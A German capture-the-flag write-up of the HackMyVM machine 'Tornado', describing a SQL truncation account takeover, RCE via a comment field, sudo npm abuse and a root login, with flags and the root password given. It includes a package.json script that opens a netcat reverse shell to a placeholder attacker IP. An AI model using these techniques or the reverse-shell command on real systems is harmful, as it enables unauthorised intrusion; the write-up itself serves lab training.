# Tornado - HackMyVM (Medium)
 
![Tornado.png](Tornado.png)

## Übersicht

*   **VM:** Tornado
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Tornado)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 10. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Tornado_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Tornado"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration einer Webanwendung `/bluesky` auf Port 80. Eine SQL Truncation Attacke auf die Registrierungsseite (`signup.php`) ermöglichte die Übernahme des `jacob`-Accounts durch Setzen eines neuen Passworts (`1234`). Nach dem Login als `jacob` wurde eine RCE-Schwachstelle in einem Kommentarfeld auf `contact.php` ausgenutzt, um eine Python-Reverse-Shell als `www-data` zu erhalten. Als `www-data` zeigte `sudo -l`, dass `/usr/bin/npm` als Benutzer `catchme` ausgeführt werden durfte. Durch Erstellen einer manipulierten `package.json`-Datei und Ausführen von `npm run-script` wurde eine Reverse Shell als `catchme` erlangt. Die User-Flag wurde in dessen Home-Verzeichnis gefunden, ebenso ein Skript `enc.py`. Die Analyse dieses Skripts (im Log nicht detailliert, aber impliziert) führte zum Root-Passwort `idkrootpassword`, was den direkten Login als `root` via `su` ermöglichte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `nikto`
*   `Burp Suite`
*   `nc` (netcat)
*   `python3`
*   `stty`
*   `sudo`
*   `cd`
*   `mkdir`
*   `pico` (oder anderer Texteditor wie `nano`/`vi`)
*   `npm`
*   `id`
*   `pwd`
*   `ls`
*   `cat`
*   `su`
*   Standard Linux-Befehle (`export`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Tornado" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.110`).
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH) und 80 (HTTP - Apache 2.4.38).
    *   `gobuster` auf Port 80 fand das Verzeichnis `/bluesky/`.
    *   Ein weiterer `gobuster`-Scan auf `/bluesky/` offenbarte eine Webanwendung mit Login (`login.php`) und Registrierung (`signup.php`).
    *   Hinweise auf Benutzernamen (`jacob@tornado` etc.) wurden (implizit) gefunden.

2.  **Initial Access (SQL Truncation & RCE zu `www-data`):**
    *   Durchführung einer SQL Truncation Attacke auf `http://tornado.hmv/bluesky/signup.php`. Ein Benutzer `jacob\` (oder ähnlich, manipuliert zu `jacob%5c1`) wurde mit dem Passwort `1234` registriert, was das Passwort des bestehenden `jacob`-Accounts überschrieb.
    *   Login als `jacob` mit Passwort `1234`.
    *   Ausnutzung einer RCE-Schwachstelle im Kommentarfeld von `contact.php` durch Einfügen eines Python-Reverse-Shell-Payloads.
    *   Erlangung einer interaktiven Shell als `www-data`.

3.  **Privilege Escalation (von `www-data` zu `catchme` via `sudo npm`):**
    *   `sudo -l` als `www-data` zeigte: `(catchme) NPASSWD: /usr/bin/npm`.
    *   Erstellung eines Verzeichnisses `/tmp/cool` und einer `package.json`-Datei darin mit einem Skript, das eine Reverse Shell startete:
        ```json
        {
          "scripts": {
            "cool": "nc [Angreifer-IP] 4444 -e /bin/sh"
          }
        }
        ```
    *   Ausführung von `sudo -u catchme npm run-script cool` aus `/tmp/cool/`.
    *   Erlangung einer interaktiven Shell als `catchme`.
    *   User-Flag `HMVkeyedcaesar` in `/home/catchme/user.txt` gelesen. Im selben Verzeichnis wurde `enc.py` gefunden.

4.  **Privilege Escalation (von `catchme` zu `root`):**
    *   *Der genaue Mechanismus zur Ableitung des Root-Passworts aus `enc.py` ist im Log nicht detailliert, wird aber impliziert.*
    *   Das Root-Passwort wurde als `idkrootpassword` identifiziert.
    *   Wechsel zum Root-Benutzer mittels `su root` und dem Passwort `idkrootpassword`.
    *   Erlangung einer Root-Shell.
    *   Root-Flag `HMVgoodwork` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **SQL Truncation Attack:** Eine Schwachstelle im Registrierungsprozess ermöglichte die Übernahme eines bestehenden Benutzerkontos durch Überschreiben des Passworts.
*   **Remote Code Execution (RCE) via unsanitisierter Eingabe:** Ein Kommentarfeld erlaubte die Ausführung von serverseitigem Code (Python).
*   **Unsichere `sudo`-Konfiguration (`npm`):** Die Erlaubnis, `npm` als anderer Benutzer auszuführen, ermöglichte die Ausführung beliebigen Codes über manipulierte `package.json`-Skripte.
*   **Informationsleck durch Skript (impliziert `enc.py`):** Ein Skript im Home-Verzeichnis eines Benutzers enthielt oder ermöglichte die Ableitung des Root-Passworts.

## Flags

*   **User Flag (`/home/catchme/user.txt`):** `HMVkeyedcaesar`
*   **Root Flag (`/root/root.txt`):** `HMVgoodwork`

## Tags

`HackMyVM`, `Tornado`, `Medium`, `SQL Truncation`, `RCE`, `Python`, `sudo Exploitation`, `npm`, `Privilege Escalation`, `Linux`, `Web`
